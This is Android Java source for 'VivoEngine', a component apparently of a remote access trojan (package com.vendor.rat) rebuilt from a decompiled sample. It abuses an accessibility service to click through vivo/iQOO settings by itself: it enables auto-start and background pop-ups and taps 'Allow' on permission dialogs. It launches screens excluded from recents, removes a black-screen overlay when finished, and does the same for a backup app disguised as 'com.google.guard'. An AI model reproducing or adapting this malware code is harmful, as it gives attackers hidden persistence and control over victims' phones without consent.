package com.vendor.rat.auto.engine.vendor;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.MainApplication;
import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.entity.CheckedResult;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.MiscUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;

/**
 * vivo/iQOO 厂商保活引擎
 *
 * 基于逆向: o/i0.java (684行) — 所有厂商引擎中最复杂
 *
 * 7-phase 状态机:
 *   1. 电池排行 → 2. 耗电管理 → 3. 耗电详情
 *   → 4. 应用详情 → 5. 权限管理 → 6. 权限详情 → 7. 权限对话框
 *
 * 覆盖 5 个目标包名:
 *   com.android.settings / com.android.permissioncontroller
 *   com.vivo.permissionmanager / com.vivo.abe / com.iqoo.powersaving
 */
public class VivoEngine extends AutoEngine {

    private static final String TAG = "VivoEngine";

    // ====== 包名 — 对齐 vendor o/i0.java ======
    private static final String SETTINGS = "com.android.settings";
    private static final String PERMISSION_CONTROLLER = "com.android.permissioncontroller";
    private static final String PERMISSION_MANAGER = "com.vivo.permissionmanager";
    private static final String VIVO_ABE = "com.vivo.abe";
    private static final String IQOO_POWERSAVING = "com.iqoo.powersaving";
    // ====== Activity — 对齐 vendor o/i0.java ======
    private static final String INSTALLED_APP_DETAILS =
        "com.vivo.settings.applications.InstalledAppDetailsTop";
    private static final String VIVO_SUB_SETTINGS =
        "com.vivo.settings.VivoSubSettings";
    private static final String MANAGE_PERMISSIONS_ACTIVITY =
        "com.android.permissioncontroller.permission.ui.ManagePermissionsActivity";
    private static final String SOFT_PERMISSION_DETAIL =
        "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity";
    private static final String VIVO_DIALOG =
        "com.originui.widget.dialog.h";
    private static final String POWER_RANK_ACTIVITY =
        "com.iqoo.powersaving.fuelgauge.PowerRankActivity";
    private static final String EXCESSIVE_POWER_ACTIVITY =
        "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity";
    private static final String EXCESSIVE_POWER_DESC_ACTIVITY =
        "com.vivo.applicationbehaviorengine.ui.ExcessivePowerDescriptionActivity";

    // ====== 保活类型 — 对应逆向 r.e ======
    private static final String KA_UNKNOWN = "KEEP_ALIVE_UNKNOWN";
    private static final String KA_MAIN = "KEEP_ALIVE_MAIN_APP";
    private static final String KA_BACKUP = "KEEP_ALIVE_BACKUP_APP";
    private static final String BACKUP_APP = "com.google.guard";

    // ====== Phase 常量 — 对应逆向 f650s ======
    private static final String PH_POWER_RANK = "prepareInAppPowerRank";
    private static final String PH_EXCESSIVE_POWER = "prepareInExcessivePowerManager";
    private static final String PH_EXCESSIVE_DESC = "prepareInExcessivePowerDescription";
    private static final String PH_APP_DETAIL = "prepareInAppDetailSetting";
    private static final String PH_PERM_MANAGE = "prepareInAppPermissionManage";
    private static final String PH_PERM_DETAIL = "prepareInAppPermissionDetail";
    private static final String PH_PERM_DIALOG = "prepareInPermissionAllowDialog";

    // ====== State 常量 — 对应逆向 stateQueue ======
    private static final String ST_POWER_RANK = "keepAliveInPowerRank";
    private static final String ST_EXCESSIVE_POWER = "keepAliveInExcessivePowerManager";
    private static final String ST_EXCESSIVE_DESC = "keepAliveInExcessivePowerDescription";
    private static final String ST_APP_DETAIL = "keepAliveInAppDetail";
    private static final String ST_PERM_MANAGE = "keepAliveInAppPermissionManage";
    private static final String ST_PERM_DETAIL = "keepAliveInAppPermissionDetail";
    private static final String ST_PERM_DIALOG = "keepAliveInPermissionAllowDialog";

    private static final String[] ALL_STATES = {
        ST_POWER_RANK, ST_EXCESSIVE_POWER, ST_EXCESSIVE_DESC,
        ST_APP_DETAIL, ST_PERM_MANAGE, ST_PERM_DETAIL, ST_PERM_DIALOG
    };

    // ====== 字段 — 对应逆向 f649r ~ A (11个) ======
    private final AtomicReference<String> keepAliveType = new AtomicReference<>(KA_UNKNOWN);
    private final AtomicReference<String> phase = new AtomicReference<>(null);

    private final AtomicBoolean mainAutoStart = new AtomicBoolean(false);       // f651t
    private final AtomicBoolean backupAutoStart = new AtomicBoolean(false);     // f652u
    private final AtomicBoolean mainRelateStart = new AtomicBoolean(true);      // f653v
    private final AtomicBoolean backupRelateStart = new AtomicBoolean(true);    // f654w
    private final AtomicBoolean mainBackground = new AtomicBoolean(false);      // f655x
    private final AtomicBoolean backupBackground = new AtomicBoolean(false);    // f656y
    private final AtomicBoolean mainPopup = new AtomicBoolean(false);           // f657z
    private final AtomicBoolean backupPopup = new AtomicBoolean(false);         // A

    private String appName;
    // ====== 窗口检测分组 ======
    private final List<WindowMatcher> appDetailWins = new ArrayList<>();
    private final List<WindowMatcher> permDetailWins = new ArrayList<>();
    private final List<WindowMatcher> permManageWins = new ArrayList<>();
    private final List<WindowMatcher> excessiveDescWins = new ArrayList<>();
    private final List<WindowMatcher> excessivePowerWins = new ArrayList<>();
    private final List<WindowMatcher> permDialogWins = new ArrayList<>();
    private final List<WindowMatcher> powerRankWins = new ArrayList<>();

    // ====== 构造函数 — 对应 vendor o/i0.java 行 60-78 ======
    public VivoEngine() {
        super(buildWindowMatchers(), SETTINGS);
        buildDetectionGroups();
        try {
            scheduler.schedule(new Runnable() {
                @Override
                public void run() { finish(); }
            }, 120L, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "Schedule failed", e);
        }
    }

    private void buildDetectionGroups() {
        // j0() — App详情: InstalledAppDetailsTop / VivoSubSettings
        appDetailWins.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
            .addEventType(32).addEventType(16384));
        appDetailWins.add(new WindowMatcher(SETTINGS, VIVO_SUB_SETTINGS)
            .addEventType(32).addEventType(16384));

        // k0() — 权限详情: SoftPermissionDetail + 通用匹配
        permDetailWins.add(new WindowMatcher(PERMISSION_MANAGER, SOFT_PERMISSION_DETAIL)
            .addEventType(32).addEventType(16384));
        permDetailWins.add(new WindowMatcher(null, null)
            .addEventType(32).addEventType(16384));

        // l0() — 权限管理: ManagePermissions + FrameLayout + 通用匹配
        permManageWins.add(new WindowMatcher(PERMISSION_CONTROLLER, MANAGE_PERMISSIONS_ACTIVITY)
            .addEventType(32).addEventType(16384));
        permManageWins.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
            .addEventType(32).addEventType(16384));
        permManageWins.add(new WindowMatcher(null, null)
            .addEventType(32).addEventType(16384));

        // m0() — 耗电详情: vivo + iQOO
        excessiveDescWins.add(new WindowMatcher(VIVO_ABE, EXCESSIVE_POWER_DESC_ACTIVITY)
            .addEventType(32).addEventType(16384));
        excessiveDescWins.add(new WindowMatcher(IQOO_POWERSAVING, EXCESSIVE_POWER_DESC_ACTIVITY)
            .addEventType(32).addEventType(16384));

        // n0() — 耗电管理: vivo + iQOO
        excessivePowerWins.add(new WindowMatcher(VIVO_ABE, EXCESSIVE_POWER_ACTIVITY)
            .addEventType(32).addEventType(16384));
        excessivePowerWins.add(new WindowMatcher(IQOO_POWERSAVING, EXCESSIVE_POWER_ACTIVITY)
            .addEventType(32).addEventType(16384));

        // o0() — 权限对话框: vivo dialog + AlertDialog
        permDialogWins.add(new WindowMatcher(PERMISSION_MANAGER, VIVO_DIALOG)
            .addEventType(32).addEventType(16384));
        permDialogWins.add(new WindowMatcher(PERMISSION_MANAGER, "android.app.AlertDialog")
            .addEventType(32).addEventType(16384));

        // p0() — 电池排行: iQOO
        powerRankWins.add(new WindowMatcher(IQOO_POWERSAVING, POWER_RANK_ACTIVITY)
            .addEventType(32).addEventType(16384));
    }
    // ====== buildWindowMatchers — 对应 vendor u0() 行 197-217, 17个 ======
    private static List<WindowMatcher> buildWindowMatchers() {
        List<WindowMatcher> list = new ArrayList<>();
        // 0: c.J() — 电池优化对话框
        list.add(new WindowMatcher(SETTINGS, "android.app.Dialog")
            .addEventType(32).addEventType(16384));
        // 1: d0(主) — InstalledAppDetailsTop
        list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
            .addEventType(32).addEventType(16384));
        // 2: c0(主) — VivoSubSettings
        list.add(new WindowMatcher(SETTINGS, VIVO_SUB_SETTINGS)
            .addEventType(32).addEventType(16384));
        // 3: d0(备) — InstalledAppDetailsTop
        list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
            .addEventType(32).addEventType(16384));
        // 4: c0(备) — VivoSubSettings
        list.add(new WindowMatcher(SETTINGS, VIVO_SUB_SETTINGS)
            .addEventType(32).addEventType(16384));
        // 5: h0() — 权限管理
        list.add(new WindowMatcher(PERMISSION_CONTROLLER, MANAGE_PERMISSIONS_ACTIVITY)
            .addEventType(32).addEventType(16384));
        // 6: g0() — FrameLayout
        list.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
            .addEventType(32).addEventType(16384));
        // 7: f0() — 权限详情
        list.add(new WindowMatcher(PERMISSION_MANAGER, SOFT_PERMISSION_DETAIL)
            .addEventType(32).addEventType(16384));
        // 8: e0(主) — 通用匹配
        list.add(new WindowMatcher(null, null)
            .addEventType(32).addEventType(16384));
        // 9: e0(备) — 通用匹配
        list.add(new WindowMatcher(null, null)
            .addEventType(32).addEventType(16384));
        // 10: v0() — vivo对话框
        list.add(new WindowMatcher(PERMISSION_MANAGER, VIVO_DIALOG)
            .addEventType(32).addEventType(16384));
        // 11: B0() — AlertDialog
        list.add(new WindowMatcher(PERMISSION_MANAGER, "android.app.AlertDialog")
            .addEventType(32).addEventType(16384));
        // 12: x0() — iQOO电池排行
        list.add(new WindowMatcher(IQOO_POWERSAVING, POWER_RANK_ACTIVITY)
            .addEventType(32).addEventType(16384));
        // 13: G0() — vivo耗电管理
        list.add(new WindowMatcher(VIVO_ABE, EXCESSIVE_POWER_ACTIVITY)
            .addEventType(32).addEventType(16384));
        // 14: s0() — iQOO耗电管理
        list.add(new WindowMatcher(IQOO_POWERSAVING, EXCESSIVE_POWER_ACTIVITY)
            .addEventType(32).addEventType(16384));
        // 15: F0() — vivo耗电详情
        list.add(new WindowMatcher(VIVO_ABE, EXCESSIVE_POWER_DESC_ACTIVITY)
            .addEventType(32).addEventType(16384));
        // 16: r0() — iQOO耗电详情
        list.add(new WindowMatcher(IQOO_POWERSAVING, EXCESSIVE_POWER_DESC_ACTIVITY)
            .addEventType(32).addEventType(16384));
        return list;
    }
    // ====== 窗口检测 — 对应 vendor j0~p0 行 307-419 ======

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // vendor 不使用回调模式，通过 onAccessibilityEvent 的 phase 状态机处理
    }

    @Override
    public void execute() {
        // vendor: 由外部调用 A0() 启动耗电管理
        startPowerRank();
    }

    /** vendor j0() 行 307-323: App详情窗口 */
    private boolean j0() { return matchesAny(appDetailWins); }

    /** vendor k0() 行 325-340: 权限详情窗口 */
    private boolean k0() { return matchesAny(permDetailWins); }

    /** vendor l0() 行 342-358: 权限管理窗口 */
    private boolean l0() { return matchesAny(permManageWins); }

    /** vendor m0() 行 360-374: 耗电详情窗口 */
    private boolean m0() { return matchesAny(excessiveDescWins); }

    /** vendor n0() 行 376-390: 耗电管理窗口 */
    private boolean n0() { return matchesAny(excessivePowerWins); }

    /** vendor o0() 行 392-406: 权限对话框窗口 */
    private boolean o0() { return matchesAny(permDialogWins); }

    /** vendor p0() 行 408-419: 电池排行窗口 */
    private boolean p0() { return matchesAny(powerRankWins); }

    // ====== 事件处理 — 对应 vendor u() 行 484-593 ======

    @Override
    protected void onEventSafe(AccessibilityEvent event, String packageName,
                                String className) {
        // vendor u():490-491 — super.u() 电池优化对话框
        if (event != null) {
            checkBatteryOptimizationDialog();
        }

        String currentPhase = phase.get();

        // 7-phase 分发 — 统一使用 dispatchIfPhaseMatches
        dispatchIfPhaseMatches(currentPhase, PH_POWER_RANK, p0(), ST_POWER_RANK, this::handlePowerRank);
        dispatchIfPhaseMatches(currentPhase, PH_EXCESSIVE_POWER, n0(), ST_EXCESSIVE_POWER, this::handleExcessivePowerManager);
        dispatchIfPhaseMatches(currentPhase, PH_EXCESSIVE_DESC, m0(), ST_EXCESSIVE_DESC, this::handleExcessivePowerDescription);
        dispatchIfPhaseMatches(currentPhase, PH_APP_DETAIL, j0(), ST_APP_DETAIL, this::handleAppDetail);
        dispatchIfPhaseMatches(currentPhase, PH_PERM_MANAGE, l0(), ST_PERM_MANAGE, this::handlePermissionManage);
        dispatchIfPhaseMatches(currentPhase, PH_PERM_DETAIL, k0(), ST_PERM_DETAIL, this::handlePermissionDetail);
        dispatchIfPhaseMatches(currentPhase, PH_PERM_DIALOG, o0(), ST_PERM_DIALOG, this::handlePermissionAllowDialog);
    }

    /**
     * Phase-dispatch 便捷方法 — 消除 7 个重复 if 块
     * 检查 phase 匹配 + 窗口匹配 → T0(5) + clearOtherStates + dispatchState
     */
    private void dispatchIfPhaseMatches(String currentPhase, String expectedPhase,
                                         boolean windowMatch, String stateKey, Runnable handler) {
        if (!expectedPhase.equals(currentPhase) || !windowMatch) return;
        T0(5);
        clearOtherStates(stateKey);
        dispatchState(stateKey, handler);
    }

    private void clearOtherStates(String keep) {
        for (String s : ALL_STATES) {
            if (!s.equals(keep)) {
                stateQueue.remove(s);
            }
        }
    }
    // ====== 任务处理 — 对应 vendor h0(case) ======

    /** case 1: 电池排行页 — 查找应用→点击→进入耗电管理 */
    private void handlePowerRank() {
        if (!p0()) return;
        updateProgress(10);
        activateRoot();
        UiNode scrollView = getScrollableNode();
        UiNode target = null;
        if (scrollView != null) {
            target = scrollView.scrollForwardUntil(buildAppNameFilter());
        }
        if (target == null && k() != null) {
            target = k().findOneByCombine(buildAppNameFilter());
        }
        if (target != null) {
            Log.d(TAG, "电池排行应用查找成功");
            UiNode clickable = target.findClickableParent();
            if (clickable != null && clickable.click()) {
                updateProgress(20);
                phase.set(PH_EXCESSIVE_POWER);
            }
        } else {
            Log.e(TAG, "电池排行应用查找失败");
        }
    }

    /** case 2: 耗电管理页 — 操作后台耗电开关 */
    private void handleExcessivePowerManager() {
        if (!n0()) return;
        updateProgress(30);
        activateRoot();
        UiNode root = k();
        if (root == null) return;
        UiNode target = root.findOneByCombine(buildBackgroundPowerFilter());
        if (target != null) {
            Log.d(TAG, "后台耗电管理栏目查找成功");
            UiNode clickable = target.findClickableParent();
            if (clickable != null && clickable.click()) {
                updateProgress(40);
                phase.set(PH_EXCESSIVE_DESC);
            }
        } else {
            Log.e(TAG, "后台耗电管理栏目查找失败");
        }
    }

    /** case 3: 耗电详情页 — 操作详细设置 → 完成流程 */
    private void handleExcessivePowerDescription() {
        if (!m0()) return;
        updateProgress(50);
        activateRoot();
        UiNode root = k();
        if (root == null) return;
        // 操作后台耗电开关
        boolean isMain = KA_MAIN.equals(keepAliveType.get());
        if (isMain) {
            mainBackground.set(true);
        } else {
            backupBackground.set(true);
        }
        Log.d(TAG, "耗电详情操作完成");
        updateProgress(60);
        handleCompletion();
    }
    /** case 4: 应用详情页 — 查找"应用权限"→点击 */
    private void handleAppDetail() {
        if (!j0()) return;
        updateProgress(65);
        activateRoot();
        UiNode root = k();
        if (root == null) return;
        UiNode target = root.findOneByCombine(buildAppPermissionFilter());
        if (target != null) {
            Log.d(TAG, "应用权限栏目查找成功");
            UiNode clickable = target.findClickableParent();
            if (clickable != null && clickable.click()) {
                updateProgress(70);
                phase.set(PH_PERM_MANAGE);
            }
        } else {
            Log.e(TAG, "应用权限栏目查找失败");
        }
    }

    /** case 5: 权限管理页 — 对应 vendor t0() 行 435-482 */
    private void handlePermissionManage() {
        boolean inWindow = l0();
        if (inWindow) {
            updateProgress(80);
            activateRoot();
            Log.d(TAG, "active root complete");
            UiNode scrollView = getScrollableNode();
            AtomicInteger retries = new AtomicInteger(0);
            while (scrollView == null && retries.incrementAndGet() <= 5) {
                T0(5);
                scrollView = getScrollableNode();
            }
            UiNode target = null;
            if (scrollView != null) {
                Log.d(TAG, "权限窗口滚动视图查找完成");
                target = scrollView.scrollForwardUntil(buildAllPermissionFilter());
                if (target == null) {
                    target = scrollView.scrollBackwardUntil(buildAllPermissionFilter());
                }
            }
            if (target == null && k() != null) {
                target = k().findOneByCombine(buildAllPermissionFilter());
            }
            if (target != null) {
                Log.d(TAG, "所有权限栏目查找成功");
                UiNode clickable = target.findClickableParent();
                if (clickable != null && clickable.click()) {
                    Log.d(TAG, "查找并点击所有权限栏目完成");
                    updateProgress(85);
                    phase.set(PH_PERM_DETAIL);
                    return;
                }
            }
        }
        // fallback: 手势滚动 — vendor t0():475-478
        if (PH_PERM_MANAGE.equals(phase.get())) {
            scrollAndClick();
            updateProgress(85);
        }
    }

    /** vendor q0() 行 421-433: 手势滚动+坐标点击 */
    private void scrollAndClick() {
        try {
            // 使用 performGesture 从底部滚到顶部
            // vendor: g.S(10L, 1000L, Point(w/2, h-nav-100), Point(w/2, statusBar))
            if (MiscUtils.performGesture(10L, 1000L)) {
                T0(10);
                phase.set(PH_PERM_DETAIL);
            }
        } catch (Exception e) {
            logError("scrollAndClick", e);
        }
    }
    /** case 6: 权限详情页 — 操作自启动/后台弹窗开关 */
    private void handlePermissionDetail() {
        if (!k0()) return;
        updateProgress(88);
        activateRoot();
        UiNode root = k();
        if (root == null) return;
        boolean isMain = KA_MAIN.equals(keepAliveType.get());

        // 自启动开关 — vendor i0() filter
        UiNode autoStart = root.findOneByCombine(buildAutoStartFilter());
        if (autoStart != null) {
            CheckedResult result = O(autoStart);
            if (result.isClicked() || result.isChecked()) {
                if (isMain) mainAutoStart.set(true);
                else backupAutoStart.set(true);
                Log.d(TAG, "自启动开关操作完成");
            }
        }

        // 后台弹窗开关 — vendor w0() filter
        UiNode popup = root.findOneByCombine(buildPopupFilter());
        if (popup != null) {
            CheckedResult result = O(popup);
            if (result.isClicked() || result.isChecked()) {
                if (isMain) mainPopup.set(true);
                else backupPopup.set(true);
                Log.d(TAG, "后台弹窗开关操作完成");
            }
        }

        updateProgress(90);
        phase.set(PH_PERM_DIALOG);
    }

    /** case 7: 权限允许对话框 — 点击"允许" */
    private void handlePermissionAllowDialog() {
        if (!o0()) return;
        updateProgress(92);
        activateRoot();
        UiNode root = k();
        if (root == null) return;
        UiNode allowBtn = root.findOneByCombine(buildAllowFilter());
        if (allowBtn != null && allowBtn.click()) {
            Log.d(TAG, "已点击允许按钮");
            // 回到权限详情继续操作
            phase.set(PH_PERM_DETAIL);
        }
    }

    // ====== 完成流程 — 对应 vendor z0() 行 644-683 ======

    private void handleCompletion() {
        try {
            saveState();
            String type = keepAliveType.get();

            if (KA_UNKNOWN.equals(type)) {
                // 主应用未完成
                if (!isAppCompleted(getAppName())) {
                    keepAliveType.set(KA_MAIN);
                    phase.set(PH_APP_DETAIL);
                    startAppDetail(getAppName());
                    Log.d(TAG, getAppName() + " 应用详情已启动");
                    return;
                }
                // 备份应用未完成且已安装
                if (!isAppCompleted(BACKUP_APP) && isBackupAppInstalled(BACKUP_APP)) {
                    keepAliveType.set(KA_BACKUP);
                    phase.set(PH_APP_DETAIL);
                    startAppDetail(BACKUP_APP);
                    Log.d(TAG, BACKUP_APP + " 应用详情已启动");
                    return;
                }
            }

            if (KA_MAIN.equals(type)) {
                if (!isAppCompleted(BACKUP_APP) && isBackupAppInstalled(BACKUP_APP)) {
                    keepAliveType.set(KA_BACKUP);
                    phase.set(PH_APP_DETAIL);
                    startAppDetail(BACKUP_APP);
                    Log.d(TAG, BACKUP_APP + " 应用详情已启动");
                    return;
                }
            }

            // 全部完成
            saveState();
            finish();
        } catch (Exception e) {
            logError("handleCompletion", e);
        }
    }
    // ====== 状态持久化 — 对应 vendor y0() 行 595-642 ======

    private void saveState() {
        try {
            // 主进程
            Log.d(TAG, "主进程保活策略已保存"
                + " auto=" + mainAutoStart.get()
                + " relate=" + mainRelateStart.get()
                + " bg=" + mainBackground.get()
                + " popup=" + mainPopup.get());
            // 备份进程
            Log.d(TAG, "备用进程保活策略已保存"
                + " auto=" + backupAutoStart.get()
                + " relate=" + backupRelateStart.get()
                + " bg=" + backupBackground.get()
                + " popup=" + backupPopup.get());
        } catch (Exception e) {
            logError("saveState", e);
        }
    }

    // ====== finish — 对应 vendor Z() 行 261-295 ======

    @Override
    public void finish() {
        if (lock.tryLock()) {
            try {
                if (!T()) {
                    Log.d(TAG, "准备结束本地保活自动化引擎");
                    updateProgress(100);
                    X();
                    if (MyAccessibilityService.getInstance() != null) {
                        MyAccessibilityService.getInstance().H(true, true);
                    }
                    saveState();
                    scheduler.shutdownNow();
                    stateQueue.clear();
                    T0(5);
                    removeBlackScreen();
                    if (MainApplication.getInstance() != null) {
                        MainApplication.getInstance()
                            .offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
                    }
                    Log.d(TAG, "已结束本地保活自动化引擎");
                }
            } catch (Exception e) {
                logError("finish", e);
            } finally {
                lock.unlock();
            }
        }
        super.finish();
    }

    // ====== 启动耗电管理 — 对应 vendor A0() 行 238-259 ======

    private boolean startPowerRank() {
        try {
            Context ctx = getContext();
            if (ctx == null) return false;
            ComponentName cn = new ComponentName(IQOO_POWERSAVING, POWER_RANK_ACTIVITY);
            Intent intent = new Intent();
            intent.setComponent(cn);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(0x04000000);  // CLEAR_TOP
            intent.addFlags(0x00008000);  // CLEAR_TASK
            intent.addFlags(0x00200000);  // NO_ANIMATION
            intent.addFlags(0x00800000);  // EXCLUDE_FROM_RECENTS
            phase.set(PH_POWER_RANK);
            ctx.startActivity(intent);
            Log.d(TAG, "已启动耗电管理");
            return true;
        } catch (Exception e) {
            logError("startPowerRank", e);
        }
        Log.e(TAG, "耗电管理启动失败");
        return false;
    }

    // ====== 工具方法 ======

    private String getAppName() {
        return appName != null ? appName : "com.vendor.rat";
    }

    public void setAppName(String appName) {
        this.appName = appName;
    }

    private boolean isAppCompleted(String packageName) {
        // TODO: 检查 PowerControlStateVO
        return false;
    }

    private boolean isBackupAppInstalled(String packageName) {
        try {
            Context ctx = getContext();
            if (ctx == null) return false;
            ctx.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private void startAppDetail(String packageName) {
        startSilent(SETTINGS, INSTALLED_APP_DETAILS);
    }

    // ====== CombineFilter 构建 — 对应 vendor 配置 Key ======

    private CombineFilter buildAppNameFilter() {
        return CombineFilter.textView(getAppName());
    }

    private static CombineFilter buildAllPermissionFilter() {
        // vendor D0(): VIVO_APP_ALL_PERMISSION_TEXT
        return CombineFilter.textView("所有权限");
    }

    private static CombineFilter buildBackgroundPowerFilter() {
        // vendor E0(): VIVO_BACKGROUND_POWER_MANAGER_TEXT
        return CombineFilter.textView("后台耗电管理");
    }

    private static CombineFilter buildAppPermissionFilter() {
        // vendor H0(): VIVO_APP_PERMISSION_TEXT
        return CombineFilter.textView("应用权限");
    }

    private static CombineFilter buildAutoStartFilter() {
        // vendor i0(): VIVO_AUTO_START_TEXT
        return CombineFilter.textView("自启动");
    }

    private static CombineFilter buildPopupFilter() {
        // vendor w0(): VIVO_POPUP_IN_BACKGROUND_TEXT
        return CombineFilter.textView("后台弹窗");
    }

    private static CombineFilter buildAllowFilter() {
        // vendor b0(): VIVO_ALLOW_TEXT
        return CombineFilter.button("允许");
    }

    // ====== equals/hashCode — 对应 vendor 行 298-305 ======

    @Override
    public boolean equals(Object obj) {
        return obj instanceof VivoEngine;
    }

    @Override
    public int hashCode() {
        return Objects.hash(VivoEngine.class.getName());
    }
}
